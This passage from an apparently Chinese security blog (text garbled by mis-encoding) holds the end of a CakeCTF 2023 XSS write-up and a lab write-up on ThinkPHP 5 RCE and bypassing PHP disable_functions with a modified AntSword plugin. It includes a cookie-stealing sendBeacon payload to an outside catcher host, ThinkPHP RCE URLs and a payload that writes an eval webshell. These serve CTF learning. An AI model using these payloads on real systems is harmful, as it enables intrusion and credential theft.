<p>è¿™é‡Œå°†ä»£ç æäº¤åè·å–è¿”å›çš„blog_idï¼š<code>39bd504f044deddfcac4a4648b17b7afbe81985b59dc6c9cb62d812103848701 </code><img src="/2023/11/CakeCTF2023-web-adBlog-%E4%B8%AA%E4%BA%BAWriteup/image-20231112222451784.png" alt="image-20231112222451784"></p>
<p>è®¿é—®8002ç«¯å£ï¼Œå¹¶æäº¤æ„é€ payloadçš„blog_id</p>
<p><img src="/2023/11/CakeCTF2023-web-adBlog-%E4%B8%AA%E4%BA%BAWriteup/image-20231112222633758.png" alt="image-20231112222633758"></p>
<p>æ­¤æ—¶èƒ½å¤Ÿæ¥æ”¶åˆ°adminè¿”å›çš„cookieå€¼:(è¿™é‡Œçš„hostå¯ä»¥å¡«å„ç§èƒ½å¤Ÿæ¥æ”¶è¿”å›åŒ…çš„ç«™ç‚¹)</p>
<p><img src="/2023/11/CakeCTF2023-web-adBlog-%E4%B8%AA%E4%BA%BAWriteup/image-20231112222721899.png" alt="image-20231112222721899"></p>
<p>è‡³æ­¤æœ¬é¢˜ä¹Ÿå°±ç»“æŸäº†ã€‚</p>
<h1 id="settimeoutä»£ç æ‰§è¡ŒåŸç†"><a class="markdownIt-Anchor" href="#settimeoutä»£ç æ‰§è¡ŒåŸç†"></a> setTimeout()ä»£ç æ‰§è¡ŒåŸç†</h1>
<p>å…ˆæ¥ç®€å•äº†è§£ä¸€ä¸‹è¿™ä¸ªå‡½æ•°</p>
<h3 id="ä½œç”¨"><a class="markdownIt-Anchor" href="#ä½œç”¨"></a> #ä½œç”¨</h3>
<p>å…¨å±€çš„ <strong><code>setTimeout()</code></strong> æ–¹æ³•è®¾ç½®ä¸€ä¸ªå®šæ—¶å™¨ï¼Œä¸€æ—¦å®šæ—¶å™¨åˆ°æœŸï¼Œå°±ä¼šæ‰§è¡Œä¸€ä¸ªå‡½æ•°æˆ–æŒ‡å®šçš„ä»£ç ç‰‡æ®µã€‚</p>
<h3 id="è¯­æ³•"><a class="markdownIt-Anchor" href="#è¯­æ³•"></a> #è¯­æ³•</h3>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(code)</span><br><span class="line"><span class="built_in">setTimeout</span>(code, delay)</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(functionRef)</span><br><span class="line"><span class="built_in">setTimeout</span>(functionRef, delay)</span><br><span class="line"><span class="built_in">setTimeout</span>(functionRef, delay, param1)</span><br><span class="line"><span class="built_in">setTimeout</span>(functionRef, delay, param1, param2)</span><br><span class="line"><span class="built_in">setTimeout</span>(functionRef, delay, param1, param2, <span class="comment">/* â€¦ ,*/</span> paramN)</span><br></pre></td></tr></table></figure>
<h3 id="å‚æ•°"><a class="markdownIt-Anchor" href="#å‚æ•°"></a> #å‚æ•°</h3>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/setTimeout#functionref"><code>functionRef</code></a></p>
<p>å½“å®šæ—¶å™¨åˆ°æœŸåï¼Œå°†è¦æ‰§è¡Œçš„ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function"><code>function</code></a>ã€‚</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/setTimeout#code"><code>code</code></a></p>
<p>è¿™æ˜¯ä¸€ä¸ªå¯é€‰è¯­æ³•ï¼Œå…è®¸ä½ åŒ…å«åœ¨å®šæ—¶å™¨åˆ°æœŸåç¼–è¯‘å’Œæ‰§è¡Œçš„å­—ç¬¦ä¸²è€Œéå‡½æ•°ã€‚ä½¿ç”¨è¯¥è¯­æ³•æ˜¯<strong>ä¸æ¨èçš„</strong>ï¼ŒåŸå› å’Œä½¿ç”¨ <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval"><code>eval()</code></a> ä¸€æ ·ï¼Œæœ‰å®‰å…¨é£é™©ã€‚</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/setTimeout#delay"><code>delay</code></a> å¯é€‰</p>
<p>å®šæ—¶å™¨åœ¨æ‰§è¡ŒæŒ‡å®šçš„å‡½æ•°æˆ–ä»£ç ä¹‹å‰åº”è¯¥ç­‰å¾…çš„æ—¶é—´ï¼Œå•ä½æ˜¯æ¯«ç§’ã€‚å¦‚æœçœç•¥è¯¥å‚æ•°ï¼Œåˆ™ä½¿ç”¨å€¼ 0ï¼Œæ„å‘³ç€â€œç«‹å³â€æ‰§è¡Œï¼Œæˆ–è€…æ›´å‡†ç¡®åœ°è¯´ï¼Œåœ¨ä¸‹ä¸€ä¸ªäº‹ä»¶å¾ªç¯æ‰§è¡Œã€‚</p>
<p>æ³¨æ„ï¼Œæ— è®ºæ˜¯å“ªç§æƒ…å†µï¼Œå®é™…å»¶è¿Ÿå¯èƒ½ä¼šæ¯”é¢„æœŸé•¿ä¸€äº›ã€‚</p>
<p>è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœå€¼ä¸æ˜¯æ•°å­—ï¼Œéšå«çš„ç±»å‹å¼ºåˆ¶è½¬æ¢ä¼šé™é»˜åœ°å¯¹è¯¥å€¼è¿›è¡Œè½¬æ¢ï¼Œä½¿å…¶æˆä¸ºä¸€ä¸ªæ•°å­—ã€‚</p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/setTimeout#param1"><code>param1</code></a>, â€¦, <code>paramN</code> å¯é€‰</p>
<p>é™„åŠ å‚æ•°ï¼Œä¸€æ—¦å®šæ—¶å™¨åˆ°æœŸï¼Œå®ƒä»¬ä¼šä½œä¸ºå‚æ•°ä¼ é€’ç»™ <code>functionRef</code> æŒ‡å®šçš„å‡½æ•°</p>
<h2 id="å¯åˆ©ç”¨ç‚¹åˆ†æ"><a class="markdownIt-Anchor" href="#å¯åˆ©ç”¨ç‚¹åˆ†æ"></a> å¯åˆ©ç”¨ç‚¹åˆ†æ</h2>
<p>å‚è§ä¸Šè¿°å‡½æ•°åŠå‚æ•°è®¾ç½®å¯ä»¥äº†è§£åˆ°ï¼Œåœ¨è®¾ç½®çš„æ—¶é—´ç»“æŸä¹‹åä¼šæ‰§è¡ŒfunctionRefæˆ–è€…codeä¸­çš„å‘½ä»¤å’Œæ“ä½œï¼Œå€Ÿæ­¤æ¥è¾¾åˆ°ä¸€ä¸ªå®šæ—¶å™¨çš„ä½œç”¨ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> content = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(<span class="title function_">atob</span>(<span class="string">&quot;&#123;&#123; content &#125;&#125;&quot;</span>));</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>).<span class="property">innerHTML</span> = content;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">detectAdBlock</span>()) &#123;</span><br><span class="line">        showOverlay = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;ad-overlay&quot;</span>).<span class="property">style</span>.<span class="property">width</span> = <span class="string">&quot;100%&quot;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> showOverlay === <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;ad&quot;</span>).<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;block&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(showOverlay, <span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   &lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>æ¥çœ‹é¢˜ç›®æ‰€ç»™çš„adblockçš„æ£€æµ‹è¡Œä¸ºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ä¸»è¦åˆ©ç”¨çš„å‚æ•°æ˜¯<code>showOverlay</code>ï¼ŒåŒæ—¶å¯ä»¥å‘ç°è¿™ä¸ª<code>showOverlay</code>æ˜¯å¯ä»¥è¢«è¦†ç›–æˆ–è€…æ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œä¹Ÿå°±è‡´ä½¿äº†æˆ‘ä»¬å¯ä»¥ä½¿å…¶æ‰§è¡Œæˆ‘ä»¬éœ€è¦çš„XSSä»£ç æ¥è¿”å›adminçš„cookieå€¼ã€‚</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt; a id = showOverlay href = <span class="string">&quot;cid:navigator.sendBeacon(&#x27;https://[yours].requestcatcher.com/test&#x27;,document.cookie);&quot;</span> &gt;&lt;/ä¸€&gt; </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œè§£é‡Šä¸€ä¸‹payloadï¼š</p>
<p>è¿™æ®µJSä»£ç è°ƒç”¨äº†<code>navigator.sendBeacon()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºå‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªå¼‚æ­¥çš„<code>POST</code>è¯·æ±‚ï¼Œé€šå¸¸ç”¨äºå‘é€ç»Ÿè®¡æ•°æ®æˆ–å…¶ä»–ç±»å‹çš„æ—¥å¿—ã€‚</p>
<p>è¯·æ±‚çš„ç›®æ ‡åœ°å€ä¸º<code>https://[yours].requestcatcher.com/test</code>è¿™é‡Œçš„åœ°å€ä½ å¯ä»¥ä»»æ„æ›¿ä»£åªè¦èƒ½æ¥å—è¿”å›åŒ…çš†å¯ã€‚</p>
<p>ä½œä¸ºè¯·æ±‚çš„ä¸»ä½“ï¼Œ<code>document.cookie</code>è¢«ä¼ é€’ç»™æœåŠ¡å™¨ã€‚<code>document.cookie</code>æ˜¯ä¸€ä¸ªJavaScriptå±æ€§ï¼Œç”¨äºè®¿é—®å½“å‰é¡µé¢çš„æ‰€æœ‰ Cookie ä¿¡æ¯ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>navigator.sendBeacon()</code>æ–¹æ³•é€šå¸¸ç”¨äºå‘é€å¯¹ç”¨æˆ·ä¸å¯è§çš„è¯·æ±‚ï¼Œä»¥é˜²æ­¢åœ¨é¡µé¢å…³é—­æ—¶è¯·æ±‚è¢«ç»ˆæ­¢ã€‚è¿™æ„å‘³ç€ç‚¹å‡»è¯¥è¶…é“¾æ¥åï¼Œå®é™…ä¸Šä¸ä¼šå¯¼èˆªåˆ°ä»»ä½•æ–°é¡µé¢ï¼Œè€Œæ˜¯åœ¨åå°å‘é€äº†ä¸€ä¸ªè¯·æ±‚ã€‚</p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Writeup</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€æ¬¡é­”æ”¹èšå‰‘bypass_disable_functionsæ’ä»¶çš„æ‰“é¶è®°å½•</title>
    <url>/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>ç®€å•ä½†æ˜¯éœ€è¦ç»†å¿ƒçš„æ‰“é¶è®°å½•å“ˆå“ˆï¼Œè›®æœ‰è¶£çš„å¤§ä½¬è½»ç‚¹é”¤<img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107035636001.png" alt="image-20231107035636001"></p>
<span id="more"></span>
<h1 id="ä¸€æ¬¡é­”æ”¹èšå‰‘bypass_disable_functionsæ’ä»¶çš„æ‰“é¶è®°å½•"><a class="markdownIt-Anchor" href="#ä¸€æ¬¡é­”æ”¹èšå‰‘bypass_disable_functionsæ’ä»¶çš„æ‰“é¶è®°å½•"></a> ä¸€æ¬¡é­”æ”¹èšå‰‘bypass_disable_functionsæ’ä»¶çš„æ‰“é¶è®°å½•</h1>
<h2 id="ä¸€-è§£é¢˜è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#ä¸€-è§£é¢˜è¿‡ç¨‹"></a> ä¸€ã€è§£é¢˜è¿‡ç¨‹</h2>
<h3 id="1å°è¯•é€šç”¨payload"><a class="markdownIt-Anchor" href="#1å°è¯•é€šç”¨payload"></a> â‘ ï¼šå°è¯•é€šç”¨payload</h3>
<p>urlï¼š<a href="http://1.117.101.154:30080/">http://1.117.101.154:30080/</a></p>
<p>æºç ï¼š<a href="http://1.117.101.154:30080/thinkphp_5.0.22_with_extend.zip">http://1.117.101.154:30080/thinkphp_5.0.22_with_extend.zip</a></p>
<p>å·²çŸ¥ï¼š<img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103182714323.png" alt="image-20231103182714323"></p>
<p>è¯»phpinfo()ï¼š</p>
<p>tk5.xé€šç”¨payloadï¼š</p>
<p><code>?s=Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</code></p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103182820721.png" alt="image-20231103182820721"></p>
<p>å¾—åˆ°<strong>disable_functions</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl,gc_collect_cycles,iconv,str_repeat,str_shuffle</span><br></pre></td></tr></table></figure>
<p>å¯åˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°(å‡è¢«banæ‰ï¼‰ï¼š</p>
<blockquote>
<p>exec()   x<br>
shell_exec()   x<br>
åå¼•å·`   x<br>
passthru()   x<br>
popen()   x<br>
proc_open()   x<br>
pcntl_exec() ï¼šéœ€è¦å¼€å¯pcntlæ‰©å±•    x<br>
COMç»„ä»¶ï¼šWscript.Shellå’ŒShell.Application  x<br>
dl()ï¼šé€šè¿‡åŠ è½½è‡ªå®šä¹‰phpæ‰©å±•çªç ´ disable_fucnitonsæŒ‡ä»¤çš„é™åˆ¶   x</p>
<p>åˆ©ç”¨PHPå†…æ ¸å˜é‡ç»•è¿‡disable_functions   x</p>
</blockquote>
<p>æ–‡ä»¶åŒ…å«é€šç”¨payloadï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://1.117.101.154:30080/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=/tmp/tw.php&amp;vars[1][]=%3C%3Fphp%20echo(%22hello%20hacker%22)%3B%40eval(%24_POST%5B&#x27;tw&#x27;%5D)%3B%3F%3E</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸€æ¬¡åŒ…å«èƒ½å¤Ÿè¿”å›ä½ å†™å…¥çš„å­—ç¬¦ä¸²é•¿åº¦</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201016733.png" alt="image-20231103201016733"></p>
<p>åŒ…å«ä¹‹åå†æ¬¡ä½¿ç”¨åŒ…å«æ¥è¯»å–ä¸Šä¸€æ¬¡åŒ…å«è¿”å›çš„å†…å®¹</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://1.117.101.154:30080/?s=Index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=think\__include_file&amp;vars[1][]=/tmp/tw.php</span><br></pre></td></tr></table></figure>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201538864.png" alt="image-20231103201538864"></p>
<p>è®¿é—®åŒ…å«çš„webshellä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°èƒ½å¤Ÿè¢«è§£æï¼Œæå‡ºantswordç›´æ¥è¿</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201659989.png" alt="image-20231103201659989"></p>
<p>ç›´æ¥è·³åˆ°æ ¹ç›®å½•æŸ¥çœ‹flag.flagæ–‡ä»¶</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103201911477.png" alt="image-20231103201911477"></p>
<p><mark>flag:  flag{FS_ROOT_49mAIg5AbsqbC7nP}</mark></p>
<p>æ­£å½“æˆ‘é•¿èˆ’ä¸€å£æ°”çš„æ—¶å€™çœ‹åˆ°ä¸€ä¸ªgetrceflagçš„å¯è¿›è¡Œæ–‡ä»¶ï¼š</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107034136826.png" alt="image-20231107034136826"></p>
<p>è¿›å…¥ç»ˆç«¯æ‰§è¡Œçœ‹çœ‹ï¼š</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107034224434.png" alt="image-20231107034224434"></p>
<p>å‘ç°é™åˆ¶äº†æ ¹ç›®å½•ï¼Œè¿™æ—¶å€™åˆçœ‹åˆ°äº†è¿˜æœ‰ä¸€ä¸ª hintï¼š</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103202436181.png" alt="image-20231103202436181"></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">æ­å–œä½ æˆåŠŸRCEï¼</span><br><span class="line">ç°åœ¨ä½ éœ€è¦<span class="keyword">Bypass </span><span class="keyword">disable_functionã€‚</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">æœ¬ç¯å¢ƒå¯ä½¿ç”¨æŸç§ç°æˆçš„<span class="keyword">bypass </span>PoCï¼Œä½†æ˜¯ç”±äº<span class="keyword">banäº†æŸäº›å‡½æ•°ï¼Œå› æ­¤ä½ éœ€è¦è‡ªè¡Œå¯¹è¯¥PoCè¿›è¡Œä¸€äº›ä½ åŠ›æ‰€èƒ½åŠçš„ä¿®æ”¹ã€‚</span></span><br><span class="line"><span class="keyword"></span>è‡³äºæ˜¯å“ªç§PoCï¼Œå˜¿å˜¿ï¼Ÿ</span><br></pre></td></tr></table></figure>
<p>ç›´æ¥ä½¿ç”¨èšå‰‘bypass disable_functionsæ’ä»¶ï¼Œè¿™é‡Œå°±éœ€è¦é­”æ”¹ä¸€ä¸‹å› ä¸ºè¢«bançš„å‡½æ•°å¤ªå¤šäº†ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,<span class="built_in">exec</span>,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl,gc_collect_cycles,iconv,str_repeat,str_shuffle</span><br></pre></td></tr></table></figure>
<h3 id="2é­”æ”¹ç»†èŠ‚è¯·å¾€åçœ‹"><a class="markdownIt-Anchor" href="#2é­”æ”¹ç»†èŠ‚è¯·å¾€åçœ‹"></a> â‘¡ï¼šé­”æ”¹ç»†èŠ‚è¯·å¾€åçœ‹</h3>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103204922812.png" alt="image-20231103204922812"></p>
<p>åŠ è½½é­”æ”¹åçš„æ’ä»¶å’Œå¯¹åº”çš„expï¼Œç‚¹å‡»å¼€å§‹ï¼š</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103205100914.png" alt="image-20231103205100914"></p>
<p>è·³è½¬åˆ°rootç›®å½•ï¼Œæ‰§è¡Œgetrceflagç¨‹åº</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231103205214990.png" alt="image-20231103205214990"></p>
<p>è·å¾—ç¬¬äºŒä¸ªflagï¼š</p>
<p><mark>flag{RCE_2A7o4zrC2b9yviVp}</mark></p>
<p>è¿™ä¸ªé¶åœºåˆ°è¿™å„¿å°±ç»“æŸå•¦ï¼ï¼ï¼ä¸‹é¢å°±æ˜¯æ’ä»¶é­”æ”¹çš„è¯¦ç»†è¿‡ç¨‹ã€‚</p>
<h2 id="äºŒ-é­”æ”¹æ’ä»¶è¿‡ç¨‹"><a class="markdownIt-Anchor" href="#äºŒ-é­”æ”¹æ’ä»¶è¿‡ç¨‹"></a> äºŒã€é­”æ”¹æ’ä»¶è¿‡ç¨‹</h2>
<h3 id="1è¢«banå‡½æ•°çš„ä½ç½®ä»¥åŠç¡®è®¤exp"><a class="markdownIt-Anchor" href="#1è¢«banå‡½æ•°çš„ä½ç½®ä»¥åŠç¡®è®¤exp"></a> â‘ ï¼šè¢«banå‡½æ•°çš„ä½ç½®ä»¥åŠç¡®è®¤exp</h3>
<p>é¦–å…ˆç¡®è®¤phpç‰ˆæœ¬ï¼ŒåŠ è½½æ’ä»¶ï¼š</p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107025022272.png" alt="image-20231107025022272"></p>
<p>php7.2ï¼Œå…ˆå¤§æ¦‚é”å®šä¸¤ä¸ªexp: <code>PHP7 Backtrace UAF</code> å’Œ<code>PHP7 GC with Certain Destructors UAF</code></p>
<p>æ­£å¸¸ç‚¹å‡»å¼€å§‹å¹¶ä¸èƒ½è¾¾åˆ°bypassçš„ä½œç”¨ï¼Œå†ç»“åˆæç¤º(hint)æ‰€è¯´ï¼š</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">æ­å–œä½ æˆåŠŸRCEï¼</span><br><span class="line">ç°åœ¨ä½ éœ€è¦<span class="keyword">Bypass </span><span class="keyword">disable_functionã€‚</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">æœ¬ç¯å¢ƒå¯ä½¿ç”¨æŸç§ç°æˆçš„<span class="keyword">bypass </span>PoCï¼Œä½†æ˜¯ç”±äº<span class="keyword">banäº†æŸäº›å‡½æ•°ï¼Œå› æ­¤ä½ éœ€è¦è‡ªè¡Œå¯¹è¯¥PoCè¿›è¡Œä¸€äº›ä½ åŠ›æ‰€èƒ½åŠçš„ä¿®æ”¹ã€‚</span></span><br><span class="line"><span class="keyword"></span>è‡³äºæ˜¯å“ªç§PoCï¼Œå˜¿å˜¿ï¼Ÿ</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹è¢«banæ‰çš„å‡½æ•°ï¼Œåœ¨èšå‰‘çš„æ’ä»¶æºç ï¼ˆä½äºantData\plugins\as_bypass_php_disable_functions-master\payload.jsï¼‰ä¸­æŸ¥æ‰¾<strong>disable_function</strong>ä¸­ä¸‹åˆ—å‡½æ•°</p>
<figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str_repeat,</span>str_shuffle</span><br></pre></td></tr></table></figure>
<p>ä¸ºä»€ä¹ˆä»…æ’æŸ¥è¿™2ä¸ªå‡½æ•°ï¼Œå…¶å®å¯¹<strong>Bypass disable_function</strong>æœ‰ä¸€å®šæŸ¥é˜…çš„å¸ˆå‚…è‚¯å®šèƒ½å‘ç°è¿™2ä¸ªå‡½æ•°ä¹‹å‰çš„å‡½æ•°éƒ½æ˜¯<strong>disable_function</strong>å¾ˆå¸¸è§çš„å‡½æ•°ã€‚</p>
<p>åœ¨<strong>PHP7_Backtrace_UAF_EXP</strong>æºç ä¸­æ‰¾åˆ°</p>
<p><mark><strong>str_repeat</strong></mark></p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030223250.png" alt="image-20231107030223250"></p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030300501.png" alt="image-20231107030300501"></p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030346773.png" alt="image-20231107030346773"></p>
<p><mark><strong>str_shuffle</strong></mark></p>
<p><img src="/2023/11/%E4%B8%80%E6%AC%A1%E9%AD%94%E6%94%B9%E8%9A%81%E5%89%91bypass-disable-functions%E6%8F%92%E4%BB%B6%E7%9A%84%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/image-20231107030529707.png" alt="image-20231107030529707"></p>
<p>æ‰¾åˆ°äº†è¢«banå‡½æ•°çš„ä½ç½®å’Œç¡®è®¤äº†expï¼Œé‚£ä¹ˆä¸‹ä¸€æ­¥å°±æ˜¯å¦‚ä½•é­”æ”¹expäº†ã€‚</p>
<h3 id="2ç¡®è®¤å‡½æ•°åŠŸèƒ½å¹¶æ‰‹åŠ¨å®ç°"><a class="markdownIt-Anchor" href="#2ç¡®è®¤å‡½æ•°åŠŸèƒ½å¹¶æ‰‹åŠ¨å®ç°"></a> â‘¡ï¼šç¡®è®¤å‡½æ•°åŠŸèƒ½å¹¶æ‰‹åŠ¨å®ç°</h3>
<p>ç¬¬ä¸€æ­¥å…ˆç¡®è®¤ä¸¤ä¸ªå‡½æ•°çš„åŠŸèƒ½ï¼š</p>
<p><code>str_repeat</code>ï¼š</p>
